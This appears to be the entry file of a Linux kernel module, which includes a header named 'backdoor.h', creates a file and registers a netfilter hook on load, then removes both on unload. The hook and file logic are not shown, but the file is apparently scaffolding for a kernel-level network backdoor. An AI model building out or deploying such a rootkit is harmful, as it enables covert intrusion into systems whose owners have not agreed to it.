#include "backdoor.h"

static int __init init_mod(void){
	printk("Inserting module\n");
	create_file();
	return nfhook_init();
}

static void __exit exit_mod(void){
	printk("Removing module\n");
	destroy_file();
	nfhook_exit();
}

module_init(init_mod);
module_exit(exit_mod);
